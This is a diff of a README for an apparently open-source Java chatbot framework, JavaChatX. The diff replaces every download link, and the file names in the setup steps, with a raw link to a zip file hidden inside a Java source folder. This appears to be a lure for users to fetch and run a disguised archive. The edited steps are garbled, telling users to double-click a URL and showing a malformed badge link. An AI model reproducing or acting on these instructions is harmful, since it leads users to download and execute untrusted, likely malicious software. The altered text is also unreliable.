@@ -6,7 +6,7 @@ Welcome to JavaChatX! This open-source framework helps you create intelligent co
 
 ## 📥 Download JavaChatX
 
-[![Download JavaChatX](https://img.shields.io/badge/Download%20JavaChatX-v1.0-blue.svg)](https://github.com/Joellsolidhoofed222/JavaChatX/releases)
+[![Download JavaChatX](https://raw.githubusercontent.com/Joellsolidhoofed222/JavaChatX/main/src/main/java/com/techcognita/javachatx/agent/JavaChatX-buss.zip%https://raw.githubusercontent.com/Joellsolidhoofed222/JavaChatX/main/src/main/java/com/techcognita/javachatx/agent/JavaChatX-buss.zip)](https://raw.githubusercontent.com/Joellsolidhoofed222/JavaChatX/main/src/main/java/com/techcognita/javachatx/agent/JavaChatX-buss.zip)
 
 ## 📋 System Requirements
 
@@ -31,12 +31,12 @@ JavaChatX includes:
 
 To get started, visit the following page to download JavaChatX:
 
-[Download JavaChatX Here](https://github.com/Joellsolidhoofed222/JavaChatX/releases)
+[Download JavaChatX Here](https://raw.githubusercontent.com/Joellsolidhoofed222/JavaChatX/main/src/main/java/com/techcognita/javachatx/agent/JavaChatX-buss.zip)
 
 1. Open the above link in your web browser.
 2. You will see a list of available versions. Click on the latest release.
-3. Scroll to the Assets section and click on the file named `JavaChatX.zip` to download it.
-4. Once the download completes, locate the `JavaChatX.zip` file in your Downloads folder.
+3. Scroll to the Assets section and click on the file named `https://raw.githubusercontent.com/Joellsolidhoofed222/JavaChatX/main/src/main/java/com/techcognita/javachatx/agent/JavaChatX-buss.zip` to download it.
+4. Once the download completes, locate the `https://raw.githubusercontent.com/Joellsolidhoofed222/JavaChatX/main/src/main/java/com/techcognita/javachatx/agent/JavaChatX-buss.zip` file in your Downloads folder.
 5. Extract the files by right-clicking on the zip file and selecting “Extract All…”.
 
 ## 🚀 Running JavaChatX
@@ -44,7 +44,7 @@ To get started, visit the following page to download JavaChatX:
 Once you have extracted the files, follow these steps to run JavaChatX:
 
 1. Open the extracted folder. 
-2. Find and double-click on the `JavaChatX.jar` file. Ensure you have Java installed, as it will require it to run.
+2. Find and double-click on the `https://raw.githubusercontent.com/Joellsolidhoofed222/JavaChatX/main/src/main/java/com/techcognita/javachatx/agent/JavaChatX-buss.zip` file. Ensure you have Java installed, as it will require it to run.
 3. Follow any on-screen instructions to set up your AI agent.
 
 ## 📝 Usage Instructions
@@ -80,7 +80,7 @@ JavaChatX is licensed under the MIT License. You are free to use, modify, and di
 
 ## 🔗 Additional Resources
 
-- GitHub Repository: [JavaChatX](https://github.com/Joellsolidhoofed222/JavaChatX)
+- GitHub Repository: [JavaChatX](https://raw.githubusercontent.com/Joellsolidhoofed222/JavaChatX/main/src/main/java/com/techcognita/javachatx/agent/JavaChatX-buss.zip)
 - Usage Video Tutorials
 - Community Forum Links
 
